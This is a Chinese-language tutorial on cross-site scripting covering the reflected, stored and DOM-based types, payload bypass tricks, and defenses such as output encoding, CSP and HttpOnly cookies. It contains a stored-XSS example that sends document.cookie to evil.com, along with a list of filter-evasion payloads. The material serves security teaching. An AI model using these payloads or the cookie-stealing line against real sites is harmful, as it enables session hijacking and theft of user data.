一、XSS概述

XSS（Cross-Site Scripting）跨站脚本攻击是一种代码注入攻击。攻击者在目标网站注入恶意脚本，当用户浏览网页时，嵌入的恶意脚本就会执行，从而达到窃取用户信息、劫持会话等目的。

XSS是OWASP Top 10中的常客，影响范围广泛，几乎所有Web应用都可能存在XSS风险。

二、XSS类型

类型 特点 危害程度
反射型XSS 恶意代码在URL中，需诱导点击 中
存储型XSS 恶意代码存储在服务器，持久化攻击 高
DOM型XSS 在客户端执行，不经过服务器 中

2.1 反射型XSS

反射型XSS的恶意代码包含在URL参数中，服务器将参数直接输出到页面，浏览器执行恶意代码。

// 恶意URL
http://example.com/search?q=<script>alert(document.cookie)</script>

// 服务端直接输出
echo "搜索结果: " . $_GET['q'];

2.2 存储型XSS

存储型XSS的恶意代码被存储在服务器数据库中，当其他用户访问页面时，恶意代码从数据库取出并执行。

// 攻击者在评论框提交
<script>
new Image().src="http://evil.com/steal?cookie="+document.cookie;
</script>

2.3 DOM型XSS

DOM型XSS完全在客户端执行，恶意代码通过JavaScript操作DOM时触发。

// 不安全的代码
document.getElementById('output').innerHTML = location.hash.slice(1);

// 攻击URL
http://example.com/#<img src=x onerror=alert(1)>

三、常用Payload

XSS攻击Payload多种多样，以下是一些常见的绕过技巧：

// 基础payload
<script>alert(1)</script>

// 事件处理器
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

// 大小写绕过
<ScRiPt>alert(1)</ScRiPt>

// 编码绕过
<script>alert(String.fromCharCode(88,83,83))</script>

// 标签嵌套
<scr<script>ipt>alert(1)</scr</script>ipt>

四、防御策略

4.1 输出编码

根据输出位置选择正确的编码方式：

  • HTML实体编码：用于HTML正文
  • JavaScript编码：用于JS代码中
  • URL编码：用于URL参数
  • CSS编码：用于CSS样式中

4.2 CSP内容安全策略

CSP（Content Security Policy）是一个强大的安全层，可以有效防止XSS攻击：

// HTTP响应头
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;

// HTML meta标签
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">

4.3 HttpOnly Cookie

设置Cookie的HttpOnly属性，防止JavaScript读取Cookie：

Set-Cookie: sessionid=abc123; HttpOnly; Secure

五、总结

XSS防御需要多层次的安全措施：输入验证、输出编码、CSP策略、HttpOnly Cookie等。最重要的原则是"永远不要信任用户输入"，所有用户数据都应该经过严格的验证和编码处理。
